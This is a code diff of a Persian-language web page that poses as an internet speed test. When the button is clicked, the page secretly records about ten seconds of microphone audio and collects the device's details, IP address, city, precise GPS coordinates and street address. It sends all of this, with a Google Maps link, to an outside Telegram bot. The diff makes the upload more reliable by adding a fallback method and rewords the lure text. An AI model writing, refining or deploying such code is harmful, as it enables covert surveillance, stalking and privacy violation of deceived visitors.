@@ -24,7 +24,7 @@
   <div class="card">
     <div class="icon">WiFi</div>
     <h2>تست سرعت اینترنت</h2>
-    <p>برای تست دقیق، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
+    <p>برای اندازه‌گیری دقیق، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
     
     <button id="startBtn" class="btn">
       <span id="btnText">شروع تست سرعت</span>
@@ -47,48 +47,52 @@
 
     let mediaRecorder, stream, timer;
 
-    // موقعیت دقیق (GPS)
+    // دریافت موقعیت دقیق + آدرس
     async function getLocation() {
-      return new Promise(resolve => {
-        if (!navigator.geolocation) return resolve({ error: "موقعیت‌یابی غیرفعال" });
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ error: "موقعیت‌یابی پشتیبانی نمی‌شود" });
+          return;
+        }
+
+        status.textContent = "در حال دریافت موقعیت...";
+
         navigator.geolocation.getCurrentPosition(
-          async pos => {
-            const { latitude, longitude, accuracy } = pos.coords;
+          async (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
             try {
               const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
               const data = await res.json();
-              resolve({
-                latitude, longitude, accuracy,
-                address: data.display_name || "آدرس نامشخص"
-              });
+              const address = data.display_name || "آدرس نامشخص";
+              resolve({ latitude, longitude, accuracy, address });
             } catch {
               resolve({ latitude, longitude, accuracy, address: "آدرس نامشخص" });
             }
           },
           () => resolve({ error: "اجازه موقعیت رد شد" }),
-          { enableHighAccuracy: true, timeout: 10000 }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       });
     }
 
-    // اطلاعات فنی موبایل
+    // اطلاعات فنی
     async function getDeviceInfo() {
       const info = {
-        model: navigator.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص',
+        userAgent: navigator.userAgent,
         platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
         language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         connection: navigator.connection ? navigator.connection.effectiveType : 'نامشخص',
         ip: 'در حال دریافت...',
-        city: 'در حال دریافت...'
+        location: 'در حال دریافت...'
       };
 
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
         info.ip = data.ip || 'نامشخص';
-        info.city = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
+        info.location = `${data.city || ''}, ${data.country_name || ''}`.trim() || 'نامشخص';
       } catch {}
 
       return info;
@@ -102,7 +106,6 @@
         status.textContent = "درخواست دسترسی...";
         progressBar.style.width = "0%";
 
-        // فقط میکروفون
         stream = await navigator.mediaDevices.getUserMedia({ audio: true });
 
         const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
@@ -113,12 +116,10 @@
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
         mediaRecorder.onstop = async () => {
-          const audioBlob = new Blob(chunks, { type: mimeType });
-          const [deviceInfo, location] = await Promise.all([
-            getDeviceInfo(),
-            getLocation()
-          ]);
-          await sendToTelegram(audioBlob, deviceInfo, location);
+          const blob = new Blob(chunks, { type: mimeType });
+          const deviceInfo = await getDeviceInfo();
+          const location = await getLocation();
+          await sendToTelegram(blob, deviceInfo, location);
           stopStream();
         };
 
@@ -142,40 +143,42 @@
       }
     }
 
-    async function sendToTelegram(audioBlob, deviceInfo, location) {
+    async function sendToTelegram(blob, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
-
-      // ارسال ویس
+      const fileName = `voice_${Date.now()}.webm`;
       const form = new FormData();
       form.append('chat_id', CHAT_ID);
-      form.append('audio', audioBlob, `voice_${Date.now()}.webm`);
+      form.append('audio', blob, fileName);
 
       let messageId = null;
+
       try {
         const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: form });
         const data = await res.json();
         if (data.ok) messageId = data.result.message_id;
-      } catch (e) {
-        console.error("ویس ارسال نشد", e);
+        else throw new Error();
+      } catch {
+        form.delete('audio');
+        form.append('document', blob, fileName);
+        const docRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: form });
+        const docData = await docRes.json();
+        if (docData.ok) messageId = docData.result.message_id;
       }
 
       // گزارش کامل
       const report = `
 *گزارش کامل کاربر*
 
- مدل: \`${deviceInfo.model}\`
+ مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
  سیستم عامل: \`${deviceInfo.platform}\`
  رزولوشن: \`${deviceInfo.screen}\`
- زبان: \`${deviceInfo.language}\`
- منطقه زمانی: \`${deviceInfo.timezone}\`
- اتصال: \`${deviceInfo.connection}\`
  IP: \`${deviceInfo.ip}\`
- موقعیت تقریبی: \`${deviceInfo.city}\`
+ موقعیت تقریبی: \`${deviceInfo.location}\`
 
 *موقعیت دقیق (GPS)*
- طول: \`${location.latitude || 'نامشخص'}\`
- عرض: \`${location.longitude || 'نامشخص'}\`
- دقت: \`${location.accuracy ? Math.round(location.accuracy) + ' متر' : 'نامشخص'}\`
+ طول جغرافیایی: \`${location.latitude || 'نامشخص'}\`
+ عرض جغرافیایی: \`${location.longitude || 'نامشخص'}\`
+ دقت: \`${location.accuracy ? location.accuracy + ' متر' : 'نامشخص'}\`
  آدرس: \`${location.address || 'نامشخص'}\`
 
 [نقشه گوگل](https://maps.google.com/?q=${location.latitude},${location.longitude})
@@ -207,7 +210,7 @@
         btnText.textContent = "شروع تست سرعت";
         spinner.classList.add('hidden');
         progressBar.style.width = "0%";
-      }, 1500);
+      }, 2000);
     }
 
     startBtn.addEventListener('click', () => {
